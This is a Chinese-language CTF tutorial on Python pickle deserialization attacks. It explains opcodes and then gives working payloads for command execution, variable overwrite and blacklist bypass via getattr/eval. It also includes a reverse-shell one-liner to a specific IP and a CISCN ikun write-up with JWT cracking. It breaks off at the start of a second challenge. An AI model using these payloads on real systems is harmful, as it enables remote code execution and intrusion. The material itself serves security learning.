## 前置知识
### 什么是Pickle
pickle是Python中一个能够序列化和反序列化对象的模块。和其他语言类似，Python也提供了序列化和反序列化这一功能，其中一个实现模块就是pickle。在Python中，“Pickling” 是将 Python 对象及其所拥有的层次结构转化为一个**二进制字节流**的过程，也就是我们常说的序列化，而 `unpickling` 是相反的操作，会将字节流转化回一个对象层次结构。
当然在Python 中并不止pickle一个模块能够进行这一操作，更原始的序列化模块如`marshal`，同样能够完成序列化的任务，不过两者的侧重点并不相同，`marshal`存在主要是为了支持 Python 的`.pyc`文件。现在开发时一般首选pickle。
### 使用示例
```python
import pickle  
  
class Person:  
    def __init__(self):  
        self.name = "Xin"  
        self.age = 18  
p = Person()  
opcode = pickle.dumps(p)  
print(opcode)  
# 结果如下  
# b'\x80\x04\x954\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x06Person\x94\x93\x94)\x81\x94}\x94(\x8c\x04name\x94\x8c\x03Xin\x94\x8c\x03age\x94K\x12ub.'  
P = pickle.loads(opcode)  
print(f"name is {P.name} and age is {P.age}")  
# 结果如下  
# name is Xin and age is 18
```
这里创建了一个Person类，其中有属性name和age，先使用`pickle.dumps()`函数将一个Person对象序列化成二进制字节流的形式，然后使用`pickle.loads()`将二进制字节流反序列化成一个Person对象。
### 常用函数
```
pickle.dump(obj, file, [,protocol])
```
功能：将obj对象序列化存入已经打开的file中。
参数:
obj：想要序列化的obj对象。
file：文件名称。
protocol：序列化使用的协议。如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。
```
pickle.load(file)
```
功能：将file中的对象序列化读出。 
参数: file：文件名称。
在CTF中更常见的是下面两种
```
pickle.dumps(obj[, protocol])
```
功能：将obj对象序列化为string形式，而不是存入文件中。 
参数: obj：想要序列化的obj对象。 
protocal：如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。
```
pickle.loads(string)
```
功能：从string中读出序列化前的obj对象。 
参数: string：文件名称。
### 魔术方法
**__reduce__**
构造方法，在反序列化的时候自动执行，类似于php中的__wake__ 。我们可以通过重写类的 `object.__reduce__()` 函数，使之在被实例化时按照重写的方式进行。
**__setstate__**
在反序列化时自动执行。它可以在对象从其序列化状态恢复时，对对象进行自定义的状态还原。
## Pickle工作原理
### 源码理解
```python
import pickle  
  
zj = "Xin"  
filename = "Xin"  
# 序列化  
with open(filename,"wb") as f:#以二进制可写形式打开Xin这个文件  
    pickle.dump(zj,f) #将zj这个变量对应的字符串进行序列化并写到f中  
# 读取序列化生成的文件  
with open(filename,"rb") as f:  
    print(f.read())  
# 运行结果如下  
# b'\x80\x04\x95\x07\x00\x00\x00\x00\x00\x00\x00\x8c\x03Xin\x94.'  
# 反序列化  
with open(filename,"rb") as f:# 以二进制可读形式打开文件  
    print(pickle.load(f))# 将文件内容进行反序列化并输出  
# 运行结果如下  
# Xin
```
ctrl+鼠标左键查看源码
找到load
其中最主要的是
```python
try:  
    while True:  
        key = read(1)  
        if not key:  
            raise EOFError  
        assert isinstance(key, bytes_types)  
        dispatch[key[0]](self)  
except _Stop as stopinst:  
    return stopinst.value
```
这里大致含义就是将字符串中的字符挨个进行读取，然后通过`dispatch`字典索引，调用对应方法  
这里我们的字符串是
```
b'\x80\x04\x95\x07\x00\x00\x00\x00\x00\x00\x00\x8c\x03Xin\x94.'
```
这里第一个就是`\x80`搜一下`\x80`发现
```python
PROTO          = b'\x80'  # identify pickle protocol
```
发现对应的是`PROTO`，那么这里的话就是`dispatch[PROTO[0]]`，其对应的是`load_proto`方法，跟进
```python
def load_proto(self):  
    proto = self.read(1)[0]  
    if not 0 <= proto <= HIGHEST_PROTOCOL:  
        raise ValueError("unsupported pickle protocol: %d" % proto)  
    self.proto = proto  
dispatch[PROTO[0]] = load_proto
```
发现这里是再读取一个字符串，然后这里的话是读取的`\x04`,其含义大概是说这是一个根据四号协议反序列化的字符串
第二步  
此时读取的字符串是`\x95`,搜索过后发现其对应
```python
FRAME            = b'\x95'  # indicate the beginning of a new frame
```
查`dispatch[frame[0]]`找到一个`load_frame()`函数
```python
def load_frame(self):  
    frame_size, = unpack('<Q', self.read(8))  
    if frame_size > sys.maxsize:  
        raise ValueError("frame size > sys.maxsize: %d" % frame_size)  
    self._unframer.load_frame(frame_size)  
dispatch[FRAME[0]] = load_frame
```
这里是又往后读取了八位代表frame的大小，这里的8位是`\x07\x00\x00\x00\x00\x00\x00\x00`表示其大小为`0`，后面的大致含义是将其进行二进制字节流转换然后赋值给`current_frame`。
第三步  
这里到了`\x8c`，
```python
SHORT_BINUNICODE = b'\x8c'  # push short string; UTF-8 length < 256 bytes
```
对应方法如下
```python
def load_short_binunicode(self):  
    len = self.read(1)[0]  
    self.append(str(self.read(len), 'utf-8', 'surrogatepass'))  
dispatch[SHORT_BINUNICODE[0]] = load_short_binunicode
```
又往下读取了一位，然后调用了`append`方法，继续跟进
```python
self.stack = []  
self.append = self.stack.append
```
这是设置了一个空数组，将读取的下一位放进去（入栈），下一位是`\x03Xin`
第四步  
此时继续往下读取字符串，对应的是`\x94`，
```python
MEMOIZE          = b'\x94'  # store top of the stack in memo
```
对应函数
```python
def load_memoize(self):  
    memo = self.memo  
    memo[len(memo)] = self.stack[-1]  
dispatch[MEMOIZE[0]] = load_memoize
```
这里是把栈中的-1对应元素取出，放入memo这个数组中。
第五步
最后是`.`对应的是STOP
```python
STOP           = b'.'   # every pickle ends with STOP
```
这样就结束了反序列化
也可以用`pickletools`来进行可视化
```python
pickletools.dis(opcode)
```
得到
```
    0: \x80 PROTO      4
    2: \x95 FRAME      52
   11: \x8c SHORT_BINUNICODE '__main__'
   21: \x94 MEMOIZE    (as 0)
   22: \x8c SHORT_BINUNICODE 'Person'
   30: \x94 MEMOIZE    (as 1)
   31: \x93 STACK_GLOBAL
   32: \x94 MEMOIZE    (as 2)
   33: )    EMPTY_TUPLE
   34: \x81 NEWOBJ
   35: \x94 MEMOIZE    (as 3)
   36: }    EMPTY_DICT
   37: \x94 MEMOIZE    (as 4)
   38: (    MARK
   39: \x8c     SHORT_BINUNICODE 'name'
   45: \x94     MEMOIZE    (as 5)
   46: \x8c     SHORT_BINUNICODE 'Xin'
   51: \x94     MEMOIZE    (as 6)
   52: \x8c     SHORT_BINUNICODE 'age'
   57: \x94     MEMOIZE    (as 7)
   58: K        BININT1    18
   60: u        SETITEMS   (MARK at 38)
   61: b    BUILD
   62: .    STOP
highest protocol among opcodes = 4
```
在pickle的源码里可以看到所有的反序列化操作码及其作用
```python
MARK           = b'('   # push special markobject on stack  
STOP           = b'.'   # every pickle ends with STOP  
POP            = b'0'   # discard topmost stack item  
POP_MARK       = b'1'   # discard stack top through topmost markobject  
DUP            = b'2'   # duplicate top stack item  
FLOAT          = b'F'   # push float object; decimal string argument  
INT            = b'I'   # push integer or bool; decimal string argument  
BININT         = b'J'   # push four-byte signed int  
BININT1        = b'K'   # push 1-byte unsigned int  
LONG           = b'L'   # push long; decimal string argument  
BININT2        = b'M'   # push 2-byte unsigned int  
NONE           = b'N'   # push None  
PERSID         = b'P'   # push persistent object; id is taken from string arg  
BINPERSID      = b'Q'   #  "       "         "  ;  "  "   "     "  stack  
REDUCE         = b'R'   # apply callable to argtuple, both on stack  
STRING         = b'S'   # push string; NL-terminated string argument  
BINSTRING      = b'T'   # push string; counted binary string argument  
SHORT_BINSTRING= b'U'   #  "     "   ;    "      "       "      " < 256 bytes  
UNICODE        = b'V'   # push Unicode string; raw-unicode-escaped'd argument  
BINUNICODE     = b'X'   #   "     "       "  ; counted UTF-8 string argument  
APPEND         = b'a'   # append stack top to list below it  
BUILD          = b'b'   # call __setstate__ or __dict__.update()  
GLOBAL         = b'c'   # push self.find_class(modname, name); 2 string args  
DICT           = b'd'   # build a dict from stack items  
EMPTY_DICT     = b'}'   # push empty dict  
APPENDS        = b'e'   # extend list on stack by topmost stack slice  
GET            = b'g'   # push item from memo on stack; index is string arg  
BINGET         = b'h'   #   "    "    "    "   "   "  ;   "    " 1-byte arg  
INST           = b'i'   # build & push class instance  
LONG_BINGET    = b'j'   # push item from memo on stack; index is 4-byte arg  
LIST           = b'l'   # build list from topmost stack items  
EMPTY_LIST     = b']'   # push empty list  
OBJ            = b'o'   # build & push class instance  
PUT            = b'p'   # store stack top in memo; index is string arg  
BINPUT         = b'q'   #   "     "    "   "   " ;   "    " 1-byte arg  
LONG_BINPUT    = b'r'   #   "     "    "   "   " ;   "    " 4-byte arg  
SETITEM        = b's'   # add key+value pair to dict  
TUPLE          = b't'   # build tuple from topmost stack items  
EMPTY_TUPLE    = b')'   # push empty tuple  
SETITEMS       = b'u'   # modify dict by adding topmost key+value pairs  
BINFLOAT       = b'G'   # push float; arg is 8-byte float encoding  
  
TRUE           = b'I01\n'  # not an opcode; see INT docs in pickletools.py  
FALSE          = b'I00\n'  # not an opcode; see INT docs in pickletools.py  
  
# Protocol 2  
  
PROTO          = b'\x80'  # identify pickle protocol  
NEWOBJ         = b'\x81'  # build object by applying cls.__new__ to argtuple  
EXT1           = b'\x82'  # push object from extension registry; 1-byte index  
EXT2           = b'\x83'  # ditto, but 2-byte index  
EXT4           = b'\x84'  # ditto, but 4-byte index  
TUPLE1         = b'\x85'  # build 1-tuple from stack top  
TUPLE2         = b'\x86'  # build 2-tuple from two topmost stack items  
TUPLE3         = b'\x87'  # build 3-tuple from three topmost stack items  
NEWTRUE        = b'\x88'  # push True  
NEWFALSE       = b'\x89'  # push False  
LONG1          = b'\x8a'  # push long from < 256 bytes  
LONG4          = b'\x8b'  # push really big long  
  
_tuplesize2code = [EMPTY_TUPLE, TUPLE1, TUPLE2, TUPLE3]  
  
# Protocol 3 (Python 3.x)  
  
BINBYTES       = b'B'   # push bytes; counted binary string argument  
SHORT_BINBYTES = b'C'   #  "     "   ;    "      "       "      " < 256 bytes  
  
# Protocol 4  
  
SHORT_BINUNICODE = b'\x8c'  # push short string; UTF-8 length < 256 bytes  
BINUNICODE8      = b'\x8d'  # push very long string  
BINBYTES8        = b'\x8e'  # push very long bytes string  
EMPTY_SET        = b'\x8f'  # push empty set on the stack  
ADDITEMS         = b'\x90'  # modify set by adding topmost stack items  
FROZENSET        = b'\x91'  # build frozenset from topmost stack items  
NEWOBJ_EX        = b'\x92'  # like NEWOBJ but work with keyword only arguments  
STACK_GLOBAL     = b'\x93'  # same as GLOBAL but using names on the stacks  
MEMOIZE          = b'\x94'  # store top of the stack in memo  
FRAME            = b'\x95'  # indicate the beginning of a new frame  
  
# Protocol 5  
  
BYTEARRAY8       = b'\x96'  # push bytearray  
NEXT_BUFFER      = b'\x97'  # push next out-of-band buffer  
READONLY_BUFFER  = b'\x98'  # make top of stack readonly
```
### 常用opcode
其中常用的opcode有这些

| opcode  | 描述                                                                       | 具体写法                              | 栈上的变化                           | memo上的变化 |
| ------- | ------------------------------------------------------------------------ | --------------------------------- | ------------------------------- | -------- |
| c       | 获取一个全局对象或import一个模块（注：会调用import语句，能够引入新的包）会加入self.stack                  | c[module]\n[instance]\n           | 获得的对象入栈                         | 无        |
| o       | 寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）      | o                                 | 这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈 | 无        |
| i       | 相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）   | i[module]\n[callable]\n           | 这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈  | 无        |
| N       | 实例化一个None                                                                | N                                 | 获得的对象入栈                         | 无        |
| S       | 实例化一个字符串对象                                                               | S'xxx'\n（也可以使用双引号、\'等python字符串形式） | 获得的对象入栈                         | 无        |
| V       | 实例化一个UNICODE字符串对象                                                        | Vxxx\n                            | 获得的对象入栈                         | 无        |
| I(大写的i) | 实例化一个int对象                                                               | Ixxx\n                            | 获得的对象入栈                         | 无        |
| F       | 实例化一个float对象                                                             | Fx.x\n                            | 获得的对象入栈                         | 无        |
| R       | 选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数                             | R                                 | 函数和参数出栈，函数的返回值入栈                | 无        |
| .       | 程序结束，栈顶的一个元素作为pickle.loads()的返回值                                         | .                                 | 无                               | 无        |
| (       | 向栈中压入一个MARK标记                                                            | (                                 | MARK标记入栈                        | 无        |
| t       | 寻找栈中的上一个MARK，并组合之间的数据为元组                                                 | t                                 | MARK标记以及被组合的数据出栈，获得的对象入栈        | 无        |
| )       | 向栈中直接压入一个空元组                                                             | )                                 | 空元组入栈                           | 无        |
| l(小写的L) | 寻找栈中的上一个MARK，并组合之间的数据为列表                                                 | l                                 | MARK标记以及被组合的数据出栈，获得的对象入栈        | 无        |
| ]       | 向栈中直接压入一个空列表                                                             | ]                                 | 空列表入栈                           | 无        |
| d       | 寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）                          | d                                 | MARK标记以及被组合的数据出栈，获得的对象入栈        | 无        |
| }       | 向栈中直接压入一个空字典                                                             | }                                 | 空字典入栈                           | 无        |
| p       | 将栈顶对象储存至memo_n（记忆栈）                                                      | pn\n                              | 无                               | 对象被储存    |
| g       | 将memo_n的对象压栈                                                             | gn\n                              | 对象被压栈                           | 无        |
| 0       | 丢弃栈顶对象（self.stack）                                                       | 0                                 | 栈顶对象被丢弃                         | 无        |
| b       | 使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置                            | b                                 | 栈上第一个元素出栈                       | 无        |
| s       | 将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中             | s                                 | 第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新  | 无        |
| u       | 寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中 | u                                 | MARK标记以及被组合的数据出栈，字典被更新          | 无        |
| a       | 将栈的第一个元素append到第二个元素(列表)中                                                | a                                 | 栈顶元素出栈，第二个元素（列表）被更新             | 无        |
| e       | 寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中                        | e                                 | MARK标记以及被组合的数据出栈，列表被更新          | 无        |
## 漏洞利用
### 全局变量覆盖
例如存在一个文件`secret.py`内容是
```python
key = '666'
```
，我们要把他改成`Xin`
方法的话其实是很简单的，我们只需要通过`c`操作符得到全局变量`secret`，然后利用`b`操作符修改属性值即可，构造payload如下
```
c__main__
secret
(S'key'
S'Xin'
db.
```
测试代码
```python
import pickle  
import secret  
  
payload="""c__main__  
secret  
(S'key'  
S'Xin'  
db."""  
print(f"before:{secret.key}")  
output = pickle.loads(payload.encode())  
print(f"output:{output}")  
print(f"after:{secret.key}")  
#结果如下  
"""  
before:666  
output:<module 'secret' from 'D:\\pythonwenjian\\pytext3\\secret.py'>  
after:Xin  
"""
```
### 函数执行
#### `__reduce__`方法
```
__reduce__
调用:被定义之后，当对象被pickle时就会触发
作用:如果接收到的是字符串，就会把这个字符串当成一个全局变量的名称，然后Python查找它并进去pickle
    如果接收到的是元组，这个元组应该包含2-6个元素，其中包括：一个可调用对象，用于创建对象，参数元素，供对象调用
```
例如
```python
import os  
import pickle  
  
class test():  
    def __reduce__(self):  
        return (os.system,('whoami',))  
a = test()  
payload = pickle.dumps(a)  
print(payload)  
pickle.loads(payload)  
# 执行结果如下  
# b'\x80\x04\x95\x1e\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\x06whoami\x94\x85\x94R\x94.'  
# laptop-3i2gtl5g\lenovo
```
这样就可以成功执行命令。
这个不仅可以命令执行，还可以反弹shell。
```python
import os  
import pickle  
  
class test():  
    def __reduce__(self):  
        cmd = 'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\"121.89.81.39\\",2333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\"/bin/sh\\",\\"-i\\"]);"'  
        return (os.system,(cmd,))  
a = test()  
payload = pickle.dumps(a)  
pickle.loads(payload)
```
#### 编写opcode实现函数执行
但是通过`__reduce__`一次只能执行一个命令，如果想一次执行多个命令，就只能通过手写opcode的方式了。
举个简单的例子
```python
import pickle  
  
opcode =b"""cos  
system  
(S'whoami'  
tRcos  
system  
(S'whoami'  
tR."""  
pickle.loads(opcode)
```
执行结果
```
laptop-3i2gtl5g\lenovo
laptop-3i2gtl5g\lenovo
```
因为pickle用的是二进制数据，所以要用b标记字节字符串。
在pickle中和函数执行的字节码有三个：`R`、`i`、`o`，所以我们可以从三个方向构造paylaod
- `R`
```python
opcode =b"""cos
system
(S'whoami'
tR."""
```
- `i`相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）
```python
opcode =b"""(S'whoami'
ios
system
."""
```
- `o`寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）
```python
opcode =b"""(cos
system
S'whoami'
o."""
```
**注意**
部分Linux系统下和Windows下的opcode字节流并不兼容，比如Windows下执行系统命令函数为`os.system()`，在部分Linux下则为`posix.system()`。
### 实例化对象
实例化对象也是一种特殊的函数执行，我们同样可以通过手写opcode来构造
```python
import pickle  
  
class Person:  
    def __init__(self,name,age):  
        self.name = name  
        self.age = age  
opcode = b"""c__main__  
Person  
(S'Xin'  
I18  
tR."""  
p = pickle.loads(opcode)  
print(p) #<__main__.Person object at 0x000001A191CE5420>  
print(p.name,p.age)# Xin 18
```
以上opcode相当于手动执行了构造函数`Person('Xin',18)`。
### 全局变量引入
在碰到**s操作码时，会弹出两个字符串作为键值对保存在字典中**，我们可以通过**c操作码来得到secret.best**，再使animal=secret.best，这样就成功引入了全局变量
find_class 中的 getattr是通过 sys.modules获取变量名的或者模块的
```python
#secret.py
best = 'cat'
```
secret也存在与sys.modules的字典中，所以 `module=secret&amp;name=best`就可以取到 secret.best的值
```python
import pickle  
import sys  
import secret  
  
class animal:  
    def __init__(self):  
        self.animal = "dog"  
    def check(self):  
        if self.animal == secret.best:  
            print(self.animal)  
# print(sys.modules)  
#a=pickle.dumps(animal(),protocol=3)  
#print(a)  
# b'\x80\x03c__main__\nanimal\nq\x00)\x81q\x01}q\x02X\x06\x00\x00\x00animalq\x03X\x03\x00\x00\x00dogq\x04sb.'  
a=b'\x80\x03c__main__\nanimal\nq\x00)\x81q\x01}q\x02X\x06\x00\x00\x00animalq\x03csecret\nbest\nq\x04sb.' # 把X\x03\x00\x00\x00dog手动替换成csecret\nbest\n  
b = pickle.loads(a)  
b.check()  
# cat
```
## WAF绕过
### 黑名单绕过
在一些例子中，我们常常会见到`module=="builtins"`这一限制，比如官方文档中的例子，只允许我们导入`builtins`这一模块
当我们启动Python之后，即使没有创建任何的变量或者函数，还是会有许多函数可以使用，如
```
>>>int(1)
1
```
上述这类函数被我们称为”内置函数”，这其实就是builtins模块的功劳，这些内置函数都是包含在builtins模块内的，是不需要`import`就可以利用的模块。而Python解释器在启动时已经自动帮我们导入了builtins模块，所以我们自然就可以使用这些内置函数了。
我们可以通过`for i in sys.modules['builtins'].__dict__:print(i)`来查看该模块中包含的所有模块函数等，大致如下
```
__name__
__doc__
__package__
__loader__
__spec__
__build_class__
__import__
abs
all
any
ascii
bin
breakpoint
callable
chr
compile
delattr
dir
divmod
eval
exec
format
getattr
globals
hasattr
hash
hex
id
input
isinstance
issubclass
iter
aiter
len
locals
max
min
next
anext
oct
ord
pow
print
repr
round
setattr
sorted
sum
vars
None
Ellipsis
NotImplemented
False
True
bool
memoryview
bytearray
bytes
classmethod
complex
dict
enumerate
filter
float
frozenset
property
int
list
map
object
range
reversed
set
slice
staticmethod
str
super
tuple
type
zip
__debug__
BaseException
Exception
TypeError
StopAsyncIteration
StopIteration
GeneratorExit
SystemExit
KeyboardInterrupt
ImportError
ModuleNotFoundError
OSError
EnvironmentError
IOError
WindowsError
EOFError
RuntimeError
RecursionError
NotImplementedError
NameError
UnboundLocalError
AttributeError
SyntaxError
IndentationError
TabError
LookupError
IndexError
KeyError
ValueError
UnicodeError
UnicodeEncodeError
UnicodeDecodeError
UnicodeTranslateError
AssertionError
ArithmeticError
FloatingPointError
OverflowError
ZeroDivisionError
SystemError
ReferenceError
MemoryError
BufferError
Warning
UserWarning
EncodingWarning
DeprecationWarning
PendingDeprecationWarning
SyntaxWarning
RuntimeWarning
FutureWarning
ImportWarning
UnicodeWarning
BytesWarning
ResourceWarning
ConnectionError
BlockingIOError
BrokenPipeError
ChildProcessError
ConnectionAbortedError
ConnectionRefusedError
ConnectionResetError
FileExistsError
FileNotFoundError
IsADirectoryError
NotADirectoryError
InterruptedError
PermissionError
ProcessLookupError
TimeoutError
open
quit
exit
copyright
credits
license
help
```
假如内置函数中一些执行命令的函数也被禁用了，而我们仍想命令执行，那么漏洞的利用思路就类似于Python中的沙箱逃逸。
举例这是[code-breaking 2018 picklecode](https://github.com/phith0n/code-breaking/tree/master/2018/picklecode)中的一个例子
```python
import pickle  
import io  
import builtins  
  
__all__ = ('PickleSerializer', )  
  
  
class RestrictedUnpickler(pickle.Unpickler):  
    blacklist = {'eval', 'exec', 'execfile', 'compile', 'open', 'input', '__import__', 'exit'}  
  
    def find_class(self, module, name):  
        # Only allow safe classes from builtins.  
        if module == "builtins" and name not in self.blacklist:  
            return getattr(builtins, name)  
        # Forbid everything else.  
        raise pickle.UnpicklingError("global '%s.%s' is forbidden" %  
                                     (module, name))
```
这里规定`if module == "builtins" and name not in self.blacklist: `只可以用`builtins`模块，并且设置了黑名单，禁用了危险的内置函数。
但是没有禁用getattr()函数，这样我们就可以从上下文已有的变量内部，去寻找一些危险属性，
**思路一**
虽然`find_class`中不允许直接使用危险函数，但这个文件开头就引入了三个看着都挺危险的模块：
```python
import pickle  
import io  
import builtins  
```
我们可以通过`builtins.getattr('builtins','eval')`来获取eval()函数，再执行即可，此时，`find_class`获得的module是`builtins`，name是`getattr`，在允许的范围中，不会被沙盒拦截。
可以先构造payload
```
builtins.getattr(builtins,'eval'),('__import__("os").system("whoami")',)
```
接下来就需要根据payload编写opcode
首先构造`builtins.getattr`，就用`c`操作符调用模块和函数
```
cbuiltins
getattr
```
此时的栈顶`<built-in function getattr>`
接下来压入的话会发现，其中builtins是对象，而其他压入的都是字符串，如果直接压入的话会出错，这里的话可以这样
然后我们需要获取当前上下文，Python中使用`globals()`获取上下文，所以我们要获取`builtins.globals`：
```
cbuiltins
globals
```
Python中globals是个字典，我们需要取字典中的某个值，所以还要获取`dict`这个对象：
```
cbuiltins
dict
```
上述这几个步骤都比较简单，我们现在加强一点难度。现在执行`globals()`函数，获取完整上下文：
```
cbuiltins
globals
(tR
```
其实也很简单，栈顶元素是builtins.globals，我们只需要再压入一个空元组`(t`，然后使用`R`执行即可。
然后我们用`dict.get`来从globals的结果中拿到上下文里的`builtins对象`，并将这个对象放置在`memo[1]`：
```
cbuiltins
getattr
(cbuiltins
dict
S'get'
tR(cbuiltins
globals
(tRS'builtins'
tRp1
```
这样就获取到了`builtins`对象。
```python
import pickle  
import builtins  
  
data=b'''cbuiltins  
getattr  
(cbuiltins  
dict  
S'get'  
tR(cbuiltins  
globals  
(tRS'builtins'  
tRp1  
.'''  
print(pickle.loads(data))  
# <module 'builtins' (built-in)>
```
接下来，我们只需要再从这个没有限制的`builtins`对象中拿到eval等真正危险的函数即可：
```
cbuiltins
getattr
(g1
S'eval'
tR
```
g1就是刚才获取到的`builtins`，我继续使用getattr，获取到了`builtins.eval`。
再执行这个eval
```
cbuiltins
getattr
(cbuiltins
dict
S'get'
tR(cbuiltins
globals
(tRS'builtins'
tRp1
cbuiltins
getattr
(g1
S'eval'
tR(S'__import__("os").system("whoami")'
tR.
```
最终执行成功
```python
s = b'''cbuiltins  
getattr  
(cbuiltins  
dict  
S'get'  
tR(cbuiltins  
globals  
(tRS'builtins'  
tRp1  
cbuiltins  
getattr  
(g1  
S'eval'  
tR(S'__import__("os").system("whoami")'  
tR.'''  
RestrictedUnpickler(io.BytesIO(s)).load()
# laptop-3i2gtl5g\lenovo
```
### 关键词绕过
#### V操作符绕过
例如之前的payload
```
c__main__  
secret  
(S'key'  
S'Xin'  
db.
```
这里如果把关键词`key`给过滤了，可以用V操作符绕过,`V`操作符可以实例化一个`unicode`字符串对象。
修改后的
```
c__main__  
secret  
(V\u006b\u0065\u0079  
S'Xin'  
db.
```
或者
```
c__main__  
secret  
(V\u006bey  
S'Xin'  
db.
```
都可以。
#### 十六进制绕过
`S`操作符是可以识别十六进制的，因此这里也可以对字符进行十六进制编码，从而绕过，构造payload如下
```
c__main__  
secret  
(S'\x6bey'  
S'Xin'  
db.
```
或者
```
c__main__  
secret  
(S'\x6b\x65\x79'  
S'Xin'  
db.
```
#### 内置函数获取关键字
当我们引用某个模块时，我们可以通过`sys.modules[xxx]`来获取其全部属性，然后我们可以输出全部属性，示例如下
```python
import sys  
import secret  
  
print(dir(sys.modules['secret']))  
# ['__builtins__', '__cached__', '__doc__', '__file__', '__loader__', '__name__', '__package__', '__spec__', 'key']
```
这里可以成功找到关键字`key`，但是他放在最后一个，且是列表的形式(pickle不支持列表索引)，
所以这里的话我们可以用函数`reversed()`将列表反序，然后用`next()`函数指向关键词从而实现输出关键词，示例如下
```python
import sys  
import secret  
  
print(next(reversed(dir(sys.modules['secret']))))  
# key
```
接下来就构造opcode就行了。
```python
import pickle  
import secret  
  
payload=b'''c__main__  
secret  
((((c__main__  
secret  
i__builtin__  
dir  
i__builtin__  
reversed  
i__builtin__  
next  
S'Xin'  
db.'''  
print('before:',secret.key)  
  
output=pickle.loads(payload)  
  
print('output:',output)  
print('after:',secret.key)
```
其中**`(((`** : 在栈上压入三个标记（Mark），为后面的函数调用准备参数范围。
**`c__main__\nsecret\n`**: 获取 `secret` 模块。
**`i__builtin__\ndir\n`**: 相当于执行 `dir(secret)`。这会返回 `secret` 模块中所有属性名的**列表**。
**`i__builtin__\nreversed\n`**: 相当于执行 `reversed(上一步的列表)`。这会返回一个**反向迭代器**。
**`i__builtin__\nnext\n`**: 相当于执行 `next(反向迭代器)`。它会取出列表中的最后一个元素。
这样也可以实现变量覆盖。
## 题目

### [CISCN2019 华北赛区 Day1 Web2]ikun
先登录注册提示要买到`lv6`但是没找到，翻页对应的是`GET /shop?page=页数`
随便抓一个购买`lv5`的包，发现响应包了对应`/static/img/lv/lv5.png`那么`lv6`就是对应`lv6.png`了，写一个脚本遍历一下
```python
import requests  
  
url = "http://df2c78df-7249-4c74-8650-f0b4cd4e3f0d.node5.buuoj.cn:81/shop?page="  
  
for i in range(1,500):  
    r = requests.get(url+str(i))  
    if "lv6.png" in r.text:  
        print(i)
```
发现第181页有。
发现价格是`1145141919.0`，根本买不起。
再抓一个付款界面，可以修改discount为`0.00000001`来降低价格，但是会跳转到一个`该页面，只允许admin访问`无权限访问，但是刚才抓包发现了`JWT`可以爆破一下密钥。
用`hashcat`没爆出来，
又换了一个工具[jwt-cracker](https://github.com/brendan-rius/c-jwt-cracker)
```
D:\CTF_tools\c-jwt-cracker-master>docker run -it --rm jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlhpbiJ9.fTxPpq-o7z1K-2lVfQNcvG7Cuj1JefjDwMRtR0QMvYw
Secret is "1Kun"
```
可以得到密钥是`1Kun`再修改用户为`admin`就可以了。
进入后查看源码发现
```
|<div class="ui text container login-wrap-inf">|
|<!-- 潜伏敌后已久,只能帮到这了 -->|
|<a href="[/static/asd1f654e683wq/www.zip](http://df2c78df-7249-4c74-8650-f0b4cd4e3f0d.node5.buuoj.cn:81/static/asd1f654e683wq/www.zip)" ><span style="visibility:hidden">删库跑路前我留了好东西在这里</span></a>|
```
访问`/static/asd1f654e683wq/www.zip`就可以下载到源码。
关键在`Admin.py`里
```python
import tornado.web  
from sshop.base import BaseHandler  
import pickle  
import urllib  
  
  
class AdminHandler(BaseHandler):  
    @tornado.web.authenticated  
    def get(self, *args, **kwargs):  
        if self.current_user == "admin":  
            return self.render('form.html', res='This is Black Technology!', member=0)  
        else:  
            return self.render('no_ass.html')  
  
    @tornado.web.authenticated  
    def post(self, *args, **kwargs):  
        try:  
            become = self.get_argument('become')  
            p = pickle.loads(urllib.unquote(become))  
            return self.render('form.html', res=p, member=1)  
        except:  
            return self.render('form.html', res='This is Black Technology!', member=0)
```
这里直接将become参数url解码后直接交给pickle反序列化了。
因为源码是用python2，所以构造payload也用python2好了(因为python不同版本支持的协议不同)
```python
import pickle  
import commands  
import urllib  
  
class test(object):  
    def __reduce__(self):  
        return (commands.getoutput,("cat /flag.txt",))  
a = test()  
print(urllib.quote(pickle.dumps(a)))
```
得到payload，`ccommands%0Agetoutput%0Ap0%0A%28S%27cat%20/flag.txt%27%0Ap1%0Atp2%0ARp3%0A.`
这里用commands可以直接把结果回显出来，但是用os的话没有回显。
或者不用os和commands,因为没有任何黑名单,直接用eval(eval执行结果是回显的)
```python
import pickle  
import urllib  
  
class test(object):  
    def __reduce__(self):  
        return (eval,("__import__('os').popen('cat /flag.txt').read()",))  
a = test()  
print(urllib.quote(pickle.dumps(a)))
```
得到payload
```
c__builtin__%0Aeval%0Ap0%0A%28S%22__import__%28%27os%27%29.popen%28%27cat%20/flag.txt%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.
```
因为源码里没有`import os` 所以在这里import一下。
### [watevrCTF-2019]Pickle Store
不够买flag，但可以抓包，看到session
```
